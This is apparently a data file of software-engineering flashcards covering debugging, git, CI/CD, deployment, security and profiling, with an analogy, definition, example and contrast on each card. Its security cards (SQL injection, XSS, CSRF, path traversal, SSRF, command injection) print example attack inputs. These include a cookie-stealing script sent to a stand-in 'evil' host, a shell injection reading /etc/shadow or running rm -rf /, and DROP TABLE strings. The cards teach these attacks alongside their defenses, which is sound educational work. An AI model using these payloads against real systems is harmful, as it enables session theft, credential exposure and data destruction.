923;Hypothesis-driven debugging;A scientist in a lab coat writes 'I bet the cache is stale' in her notebook, designs ONE experiment to kill the guess, and crosses it off - never poking at random.;Debug scientifically: state one testable guess, design an observation to falsify it, and let each result prune the search space.;"H: cache serves stale config / experiment: bypass cache -> bug persists / H rejected; write the next hypothesis";"Shotgun debugging - changing many things at once; if it stops failing you have learned nothing about why."
924;Git bisect;A librarian hunts the page where a novel turns bad: open at the middle, ask 'good or bad?', discard half. A thousand commits interrogated in ten questions.;Binary-search history (or a failing input): test the midpoint, discard the good half, converge on the culprit in log2(n) steps.;"git bisect start / git bisect bad HEAD; git bisect good v2.1 / ~10 checkouts pinpoint the guilty commit";"git blame - blame shows who last touched a line; bisect finds WHICH commit changed the behavior."
925;Breakpoint debugging;"You yell FREEZE and the program stops mid-stride like a paused film; you stroll among the frozen variables reading their name tags, then advance one frame at a time.";Pause execution at a chosen line to inspect live state, then step through the code watching variables change.;breakpoint() # Python / step over / step into, inspect locals / conditional: break only if order.total < 0;"Log debugging - logs record after the fact across runs; breakpoints inspect one live moment interactively."
926;Log debugging;A ship's captain logs 'lat, lon, fuel level' at each waypoint - not 'HERE!!!' scrawled five hundred times. Reading the trail later shows exactly where the course bent.;"Strategic prints with labels, values, and timestamps at decision points trace the actual path; then remove or demote them.";log.debug('retry', attempt=n, delay=d) / not: print('here!!!') pasted 30 times / bracket the suspect call: log before and after;"Structured production logging - that is permanent telemetry; debug logging is a temporary scalpel for one hunt."
927;Rubber duck debugging;"You explain the bug line by line to a bath duck perched on the monitor; at line 14 you stop mid-sentence - saying it aloud exposed the flaw. The duck never spoke.";Explaining the code line by line out loud - even to a toy - forces a precision that reveals the flawed assumption.;"'It fetches the user... wait. / It fetches BEFORE the session exists.' / Case closed; the duck stays silent.";"Pair programming - a pair talks back; the duck works because articulation alone exposes the gap."
928;Heisenbug;A bug that hides when watched: attach the debugger and the timing shifts, so the race dissolves - like a mouse that only scurries while the kitchen light is OFF.;A bug that changes or vanishes under observation - debuggers, prints, or timing shifts perturb the race or UB causing it.;crash disappears when printf is added / the log call itself changes thread timing / tools: record/replay (rr), TSan, core dumps;"Flaky test - flakiness is nondeterminism anywhere; a heisenbug specifically hides when observed."
929;Fix cause, not symptom;"A landlord repaints the damp ceiling stain every month; the ceiling still collapses, because the leaking pipe above it was never touched.";"Trace the failure to its root cause before patching; silencing the symptom leaves the fault free to resurface elsewhere.";symptom patch: if x is None: return / actual cause: registration never saved the user / ask 'why' down the chain until the mechanism is explained;"Workaround - fine as a labeled stopgap; it turns harmful when it masquerades as the fix."
930;Atomic commits;Each commit is a single LEGO brick: one shape, one purpose, snaps in or pops out cleanly. Glue three bricks together and removing one rips out all three.;One commit equals one complete logical change that builds and passes tests - easy to review, revert, and bisect.;git add -p # stage one concern at a time / commit 1: extract price helper / commit 2: fix off-by-one using the helper;"Small commits - atomic means complete AND single-purpose; a tiny commit that breaks the build is not atomic."
931;Commit messages;"Every commit is a postcard mailed to a stranger in 2031: the front says WHAT changed in one line; the back explains WHY. 'fix stuff' is a blank postcard.";"A short imperative summary line plus a body explaining WHY the change was made; the diff already shows the what.";fix: reject expired tokens in refresh flow / / Refresh accepted tokens past exp because the check used issue time.;"Code comments - comments explain the current code; commit messages explain the change and its motivation."
932;Branching;Pull the railway switch and your train forks onto a parallel track: reshape the landscape freely while the mainline keeps running on schedule.;A branch is a movable pointer to a commit, giving an isolated line of development that is cheap to create and discard.;"git switch -c fix/rate-limit / experiment freely; main stays releasable / git branch -d fix/rate-limit after merge";"Fork - a fork copies the whole repo to another owner; a branch is a pointer inside the same repo."
933;Merge;"Two rivers meet and flow on as one; standing at the confluence - the merge commit - you can still see both original riverbeds stretching behind you.";Combines two branch histories with a merge commit that has both parents, preserving each branch's true history.;git switch main / git merge feature / log shows a merge commit with two parents;"Rebase - merge preserves both histories joined by a commit; rebase rewrites commits onto a new base for a straight line."
934;Rebase;A gardener uproots your branch and replants it atop today's trunk, regrowing each commit in order - the garden looks like you planted there all along. Tidy, and rewritten.;"Replays your commits one by one onto a new base, producing linear history with new hashes; never rewrite shared history.";git switch feature / git rebase main / push only your own branch: --force-with-lease;"Merge - rebase rewrites your commits with new hashes; merge adds one commit and changes nothing that existed."
935;Pull requests & review;Your code queues at customs: an officer opens the suitcase (the diff), asks questions in the margins, and only stamps MERGE once you have repacked it.;Propose a branch for merging so peers review the diff, discuss in comments, and require checks to pass before it enters main.;"gh pr create --fill / reviewer comments on lines; author pushes fixes / CI green + approval -> merge";"Pair programming - review is asynchronous inspection after writing; pairing is synchronous co-writing."
936;Tags & semantic versioning;Wine cellar bottles labeled 2.4.1: changing the vineyard (breaking) bumps the big number, a new grape blend adds the middle, and recorking a bad bottle bumps the last.;"Tags pin names to commits; semver MAJOR.MINOR.PATCH encodes breaking change, new feature, and bug fix respectively.";"git tag -a v2.4.1 -m 'fix connection leak' / 2.x -> 3.0.0 breaks the API; 2.4 -> 2.5 adds a feature / git push --tags";"Branch - a branch pointer moves as commits arrive; a tag stays nailed to one commit forever."
937;Revert;"Rather than tearing the poisoned entry out of the ship's log, the captain writes a new entry: 'administered antidote'. History stays honest; the poison is neutralized.";Creates a new commit applying the inverse of an earlier one, undoing its effect while keeping history intact - safe on shared branches.;git revert abc123 / new commit: Revert 'add cache layer' / history untouched, effect undone;"Reset - reset moves the branch pointer and erases history; revert adds forward history that undoes."
938;Reset;"A time machine yanks your branch pointer back three days; with --hard, everything since dissolves like an unsaved dream. Never time-travel on a shared timeline.";Moves the branch pointer to another commit: --soft keeps changes staged, --mixed unstages, --hard discards - never on shared history.;git reset --soft HEAD~1 # redo the commit / git reset --hard HEAD~3 # discard the work / rescue lost commits: git reflog;"Revert - revert is a safe forward-moving undo commit; reset rewrites where the branch points."
939;Stash;"The maitre d' whisks your half-eaten plate into the cloakroom when an urgent guest arrives; handle the emergency, present the ticket (stash pop), and your meal returns untouched.";"Shelves uncommitted changes onto a stack and restores a clean working tree; pop them back later exactly as you left them.";"git stash push -m 'wip: signup form' / git switch hotfix; fix; git switch - / git stash pop";"WIP commit - a stash is local and temporary; a WIP commit enters branch history and can be pushed."
940;Continuous integration;"Villagers pour each day's milk into the communal vat every evening; hoard yours for a month and the soured bucket no longer mixes in. Integration pain grows with time apart.";Everyone merges small changes into the shared mainline at least daily, with automated build and tests validating each merge.;push -> CI builds and tests in 8 min / branches live hours, not weeks / merge conflicts stay trivial;"Having a CI server - the practice is FREQUENT integration; a build server churning month-old branches is not CI."
941;Keep the build green;Toyota floor rule: any worker who spots a defect pulls the ANDON cord and the whole line halts until it is fixed - nobody bolts new parts onto a broken chassis.;A broken mainline build stops the line: fixing or reverting it outranks all other work, because everyone builds on top of it.;main goes red 9:14 -> revert lands 9:21 / no new merges while red / build-cop rotation owns the siren;"Tolerated 'known red' - a flaky red trains everyone to ignore red; quarantine or fix it like any breakage."
942;Pipeline stages;A bottling conveyor: rinse (lint), fill (build), cap (test), label (package), ship (deploy) - one loose cap and the belt ejects the bottle before it ever gets a label.;CI/CD runs ordered stages - lint, build, unit test, integration, package, deploy - failing fast and cheap before slow and costly.;stages: [lint, build, test, e2e, deploy] / lint fails in 40s -> e2e never runs / artifacts flow from stage to stage;"Test pyramid - the pyramid shapes the test suite; stages order the whole path from commit to production."
943;Reproducible builds;The recipe pins 'flour, lot #4711': bake it today or in five years, in any kitchen on earth, and a byte-for-byte identical loaf comes out of the oven.;The same source plus pinned, hashed dependencies yields identical artifacts on any machine - no 'works only in CI' drift.;package-lock.json / uv.lock committed / FROM node:20.11.1@sha256:8f3a... / same inputs -> same image digest;"Deterministic tests - that is stable test verdicts; reproducible builds are stable artifacts from source."
944;Environment parity;Rehearse on a cardboard stage, premiere in the opera house - the actor trips on stairs that never existed in rehearsal. 'Works on my machine' is the cardboard stage talking.;Keep dev, staging, and production as similar as possible - OS, versions, services, config shape - so bugs surface before prod.;docker-compose mirrors prod services / staging uses a prod-sized data sample / classic gap: SQLite in dev, Postgres in prod;"Reproducible builds - parity aligns runtime environments; reproducibility aligns build outputs."
945;Delivery vs deployment;"Delivery keeps a wrapped parcel by the door, ready for a human to press SEND; deployment removes the button - every green parcel walks itself to production.";"Continuous delivery keeps every mainline build releasable at the push of a button; continuous deployment removes the button entirely.";delivery: release manager clicks Deploy / deployment: merge -> production in 20 min / both demand an always-releasable trunk;"Continuous integration - CI ends at a validated merge; delivery and deployment extend the pipeline to production."
946;Feature flags;"The new chandelier is fully wired into the ballroom but its wall switch stays OFF; you flip it for the staff first, then table by table - and flip it back the instant sparks fly.";Runtime switches that decouple deploy from release: ship code dark, enable per user or percentage, kill instantly on trouble.;if flags.on('new_checkout', user): ... / ramp 1% -> 50% -> 100% / kill switch beats a 2 AM redeploy;"Config setting - flags are short-lived release levers; delete them after full rollout or they rot into dead branches."
947;Blue-green deployment;"Two identical restaurants, Blue and Green: diners fill Blue while chefs fully stage Green; flipping one entrance sign moves everyone instantly - and flips back if the soup is off.";"Run two identical production environments; deploy to the idle one, then switch all traffic at once - switch back to roll back.";green gets v2, smoke-tested while warm / load balancer flips blue -> green in one cut / rollback = flip the pointer back;"Canary release - blue-green flips 100% of traffic at once; canary shifts a small percentage gradually."
948;Canary release;Miners lower the canary down the shaft first: route 1% of traffic into the new version and watch the bird's vitals - error rate, latency - before the whole crew descends.;Route a small slice of real traffic to the new version, compare error and latency metrics against the old, then ramp or abort.;5% of pods run v2 for 30 min / p99 and error rate compared to v1 / auto-analysis promotes or rolls back;"Feature-flag rollout - a canary varies the deployed BINARY by traffic slice; flags vary a code path inside one binary."
949;Rollback;Every deploy wears a ripcord: one yank and you are back under yesterday's parachute in seconds. Teams that practice the pull rarely hit the ground.;"A fast, rehearsed path to restore the previous good version when a deploy misbehaves; cheap rollback makes deploys brave.";kubectl rollout undo deploy/api / keep DB migrations backward-compatible / mean time to restore beats live debugging;"Git revert - revert undoes a commit in source; rollback restores the previous running artifact in production."
950;Threat modeling;Before the vault is even built, the architect walks the blueprints wearing a burglar's mask, listing every window, vent, and bribable guard: what can go wrong, and where.;Systematically ask what you are building, what can go wrong, and what you will do about it - before and while building (e.g. STRIDE).;draw a data-flow diagram of checkout / STRIDE per element: spoofing? tampering? / output: a ranked backlog of mitigations;"Penetration testing - pen tests attack the built system; threat modeling finds design flaws before code exists."
951;SQL injection;"A visitor signs the guestbook: Bob'); DROP TABLE guests;-- and the naive clerk reads the name aloud as a command - the entire guest list vanishes. Data spoken as code.";Attacker-controlled text concatenated into SQL executes as SQL, reading or destroying data - e.g. input like ' OR 1=1--.;"sql = ""SELECT * FROM users WHERE name='"" + name + ""'"" / input: x' OR '1'='1 -> returns every row / input: '; DROP TABLE users;-- -> far worse";"Command injection - the same concatenation trick aimed at the OS shell; SQLi targets the database's query language."
952;Cross-site scripting (XSS);"Someone scrawls a hypnotic rune on the public comment wall; every visitor who merely READS the page falls under its spell - browsers obey graffiti as if the site itself had spoken.";Attacker-supplied script gets included in a page and runs in victims' browsers with the site's identity, stealing sessions or acting as them.;comment: <script>fetch('//evil?c='+document.cookie)</script> / rendered unescaped -> every viewer's browser runs it / stored, reflected, and DOM-based variants;"CSRF - XSS runs attacker script IN your page; CSRF makes the browser SEND forged requests without running script there."
953;Cross-site request forgery (CSRF);"While you are logged into the bank, a shady site slips your browser a pre-stamped envelope; the browser mails it WITH your signet-ring cookie attached, and the bank obeys 'your' order.";"A malicious site makes the victim's logged-in browser send a state-changing request; session cookies ride along automatically.";<img src='https://bank/transfer?to=eve&amt=9999'> / victim's session cookie is auto-attached / defense: SameSite cookies + CSRF tokens;"XSS - CSRF abuses the browser's automatic cookie-sending; XSS injects and executes script inside the page itself."
954;Buffer overflow;Pour twelve letters into an eight-letter mail slot and the extra four punch through the wall into the neighboring slot - where the program's return address was written.;Writing past a fixed-size buffer's end corrupts adjacent memory, classically overwriting the return address to hijack control flow.;"char buf[8]; gets(buf); // attacker sends 20 bytes / return address overwritten -> attacker's code runs / mitigations: bounds checks, stack canaries, ASLR";"Integer overflow - numeric wraparound in a value; it often CAUSES buffer overflows via bad size math, but corrupts numbers, not memory."
955;Path traversal;A hotel guest asks for 'room ../../master-keys': each dot-dot climbs one floor up and out of the guest wing, until the bellhop politely hands over the manager's safe.;Input like ../../etc/passwd escapes the intended directory when file paths are built from user input, exposing arbitrary files.;GET /download?file=../../../etc/passwd / server happily reads outside its folder / defense: resolve the real path, require it under the base dir;"SSRF - traversal escapes a directory on the server's disk; SSRF makes the server fetch attacker-chosen URLs."
956;Server-side request forgery (SSRF);"You hand the butler a fetch-me note reading http://169.254.169.254/keys; since the butler lives INSIDE the mansion, doors locked to outsiders swing open for him.";Tricking a server into fetching attacker-chosen URLs, reaching internal services or cloud metadata the attacker cannot touch directly.;POST /fetch?url=http://169.254.169.254/iam/creds / the server's inside position bypasses the firewall / defense: allowlist hosts, block internal IP ranges;"CSRF - CSRF forges requests FROM the victim's browser; SSRF forges requests FROM the server itself."
957;Command injection;"The ping form asks for a hostname; a visitor types 8.8.8.8; rm -rf / and the shell - reading semicolon as 'and then' - cheerfully runs the second errand.";"User input concatenated into a shell command lets metacharacters like ; or && append extra commands the server executes.";"os.system('ping ' + host) / host = '8.8.8.8; cat /etc/shadow' / defense: subprocess with an arg list, never shell=True";"SQL injection - the same concatenation flaw; only the interpreter differs (OS shell versus database engine)."
958;Supply-chain attack;"The baker's flour supplier is bribed upstream; every honest bakery in town now sells poisoned bread. One compromised npm package rides into ten thousand builds.";Compromise a dependency, build tool, or update channel so victims install malicious code through channels they already trust.;typosquat: 'requets' uploaded to PyPI / event-stream: maintainer handoff turned malicious / defense: lockfiles, hash pinning, provenance (SLSA);"Vulnerable dependency - an accidental bug in a package; a supply-chain attack is deliberate upstream compromise."
959;OWASP Top 10;A post-office wall poster of the ten most-wanted web outlaws, re-ranked every few years - the mugshots of Injection and Broken Access Control always hang near the top.;A periodically updated, community-ranked list of the most critical web application security risks - the baseline checklist.;A01 Broken Access Control / A03 Injection / used for audits, training, and requirements;"CWE - CWE exhaustively catalogs hundreds of weakness types; the OWASP Top 10 ranks the ten most critical web risks."
960;Input validation;The club bouncer checks every arrival against a strict guest list - right name format, right age, right dress code - and turns away anything unexpected at the ONLY door in.;Check all untrusted input against strict expectations - type, length, range, format - using allowlists, at the trust boundary.;"age: integer 0-130 or reject / username: ^[a-z0-9_]{3,20}$ / validate server-side; client checks are only UX";"Output encoding - validation filters what comes IN; encoding neutralizes what goes OUT into a rendering context."
961;Output encoding;Before hanging visitor art in the gallery, the curator seals each piece behind glass: the hypnotic rune is still visible as a drawing, but its magic cannot fire through the pane.;"Escape data for the context where it is emitted - HTML, attribute, JS, URL - so it displays as data and can never execute; the core XSS defense.";"<script> becomes &lt;script&gt; / modern templates auto-escape (Jinja2, React) / encode per context: HTML body vs attribute vs URL";"Input validation - validation cannot foresee every output context; encoding at the point of output is what defuses XSS."
962;Parameterized queries;The clerk now uses a rigid form: the command is pre-printed in ink and guests may only fill labeled boxes. Whatever Bob writes in the NAME box stays a name - it can never become an instruction.;Send SQL structure and user data separately as bound parameters, so input can never change the query's shape - the SQLi killer.;cur.execute('SELECT * FROM u WHERE name=%s', (name,)) / never build SQL by string concatenation / ORMs parameterize by default;"Escaping input for SQL - escaping is error-prone and dialect-specific; parameters make injection structurally impossible."
963;Least privilege;"The janitor's key opens exactly one supply closet, never the vault; when his keyring is stolen, the thief inherits mops. Grant only the doors the job requires.";Every user, process, and key gets the minimum access its task needs, so a compromise yields the smallest possible blast radius.;app DB user: SELECT/INSERT only, no DROP / CI token scoped to one repo, read-only / containers run as non-root;"Zero trust - zero trust refuses to let network location imply trust; least privilege minimizes what any identity can do."
964;Password hashing;Each password goes through a deliberately SLOW one-way meat grinder with a pinch of unique salt, so two identical steaks grind into different mince - and nothing can be un-ground.;Store only slow, salted, one-way hashes (bcrypt, argon2) so stolen databases cannot be reversed and rainbow tables are useless.;hash = bcrypt(password, salt, cost=12) / unique salt per user, stored beside the hash / never: MD5, plain SHA-256, or plaintext;"Encryption - encryption is reversible with a key; password hashing must be one-way, verified by re-hashing."
965;Secrets management;"API keys taped under the doormat (committed to the repo) get copied by every passerby forever; the vault instead hands out short-lived keys through a slot and logs who asked.";"Keep credentials out of code and repos; inject them at runtime from a vault or environment, with rotation, audit, and short lifetimes.";a key pushed to git is burned - rotate it / vault issues short-lived DB creds per service / CI secrets: masked, scoped, rotated;"Config management - config is safe to commit; secrets must never touch the repo and need rotation plus audit."
966;TLS / encryption in transit;Letters cross town in an armored tube: sealed (encryption), tamper-evident (integrity), and the courier shows government ID (the certificate) proving he really is from the bank.;"TLS gives connections confidentiality, integrity, and server authentication via certificates; encrypt every hop, internal traffic too.";"https everywhere; HSTS header set / cert chain: leaf -> intermediate -> trusted CA / a plain-HTTP internal hop is an open postcard";"Encryption at rest - TLS protects data moving between machines; at-rest protects data sitting on disk."
967;Encryption at rest;The jewels stay locked in a safe even while sitting at home: a burglar who hauls away the entire disk drags off a box of noise without the key.;Encrypt stored data - disks, databases, backups - so stolen media or snapshots are useless without keys kept separate from the data.;AES-256 full-disk or column encryption / keys live in a KMS, never beside the data / classic breach: one unencrypted old backup;"TLS - at rest guards stored bytes against stolen disks; TLS guards bytes crossing the network."
968;Defense in depth;The castle never trusts one wall: moat, drawbridge, portcullis, inner keep, and guards at each layer. An invader who swims the moat still faces four more failures.;Layer independent controls - validation, least privilege, encryption, monitoring - so one failed defense does not mean compromise.;SQLi blocked by params AND a WAF / stolen password meets MFA, then a scoped role / each layer assumes the previous one failed;Perimeter security - a hard shell with a soft center is exactly the single layer that depth replaces.
969;Patching & updates;"The list of KNOWN holes in your roof is published in the newspaper; burglars read it too. Every night you delay patching, someone with the same list tests your shingles.";Apply security updates promptly: most breaches exploit KNOWN vulnerabilities with public CVEs, and hole age predicts exploitation.;dependabot PR: lodash CVE fix, merge today / Equifax: Struts patch available 76 days before breach / inventory + SLA: critical patches within 7 days;"Zero-day defense - zero-days are unknowable in advance; patching closes the known holes behind most breaches."
970;Measure before optimizing;A surgeon refuses to cut until the X-ray hangs on the lightbox: engineers who 'just know' the slow part operate on the healthy organ nine times out of ten.;Profile the real workload before changing code - intuition about where time goes is usually wrong - then re-measure to confirm the win.;profile: 62% in JSON parsing, not the 'slow' loop / swap the parser -> re-measure: 2.4x faster / no numbers, no optimization;"Premature optimization - the vice this rule prevents; measurement turns guessing into targeting."
971;Profiler;An X-ray of the running program: each bone glows in proportion to time spent inside it - one femur (a JSON parser) blazes white while the code you suspected is barely a shadow.;A tool that reports where a program spends time or memory, by function, turning 'it feels slow' into a ranked list of hot spots.;py-spy top --pid 4711 / perf record ./app && perf report / top entry: hash_password 71% of samples;"Benchmark - a benchmark scores overall speed; a profiler explains WHERE inside the program the time goes."
972;Sampling vs instrumentation;"A pollster phones the program a thousand times a second asking 'what are you doing RIGHT NOW?' (sampling); versus an inspector logging every function's entry and exit - exact, but the watching slows the race.";"Sampling profilers interrupt periodically to record stacks - low overhead, statistical; instrumentation logs every call exactly but distorts timing.";sampling: perf, py-spy - safe in production / instrumentation: cProfile, callgrind - exact, slow / heavy probes can move the hot spot they measure;"Distributed tracing - tracing follows individual requests across services; profiling aggregates where CPU time goes."
